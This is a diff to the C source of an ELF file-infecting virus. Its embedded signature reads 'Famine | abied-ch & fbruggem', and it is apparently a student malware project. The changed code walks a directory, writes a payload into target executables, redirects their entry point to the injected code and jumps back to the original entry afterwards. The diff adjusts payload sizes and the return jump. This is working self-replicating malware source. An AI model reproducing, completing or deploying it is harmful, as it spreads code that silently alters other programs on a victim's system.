@@ -8,6 +8,7 @@
 #include <sys/mman.h>
 #include <sys/syscall.h>
 
+#define BUILDER_SIZE 0x139;
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
 __attribute__((section(".text"))) volatile static uint8_t infected = 0;
 // Structs
@@ -100,6 +101,7 @@ _start() {
     infect_test[11] = 'e';
     infect_test[12] = 'd';
     infect_test[13] = '\0';
+    ft_write(1, infect_test, ft_strlen(infect_test));
     int fd_in = ft_open(infect_test, O_RDONLY, 0);
     if (fd_in < 0) infected = 1;
 
@@ -147,9 +149,11 @@ _start() {
 
     if (infect_dir(dir0, &file_self)) ft_exit(1);
 
-    void (*func_ptr)() = (void (*)())0x40a560;
-    func_ptr();
+    Elf64_Ehdr *header = file_self.mem;
+    uint64_t jump_to = header->e_entry + 0xdf;
+    __asm__ volatile("jmp *%0" : : "r"(jump_to));
 }
+// 0x4ef1d0
 
 __attribute__((always_inline)) inline int
 infect_dir(volatile char *dir_path, volatile file *file_self) {
@@ -215,7 +219,7 @@ infect_file(volatile char *path, volatile file *file_self) {
 
     volatile Elf64_Ehdr *header_self = file_self->mem;
     void *builder_self_start = file_self->mem + addr_to_offset(file_self, header_self->e_entry);
-    uint64_t builder_self_size = 0xdf;
+    uint64_t builder_self_size = BUILDER_SIZE;
 
     uint64_t *builder_self_table_start = builder_self_start + builder_self_size - 16;
     uint64_t *builder_self_table_size = builder_self_start + builder_self_size - 8;
@@ -270,7 +274,7 @@ infect_file(volatile char *path, volatile file *file_self) {
     *target_scaffold_num = scaffold_target_size;
 
     header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);
-    //  TODO: check if all stuff is put into the correct places
+
     if (file_write(fd_target, &file_target)) ft_exit(44);
     char index = 'i';
     for (int i = 0; i < scaffold_target_size; i++) {
@@ -436,7 +440,7 @@ old_entry_get(volatile file *file) {
     Elf64_Ehdr *header = file->mem;
 
     uint64_t builder_start_offset = addr_to_offset(file, header->e_entry);
-    uint64_t builder_size = 0xdf;
+    uint64_t builder_size = BUILDER_SIZE;
 
     uint64_t old_entry_offset = builder_start_offset + builder_size - 24;
 
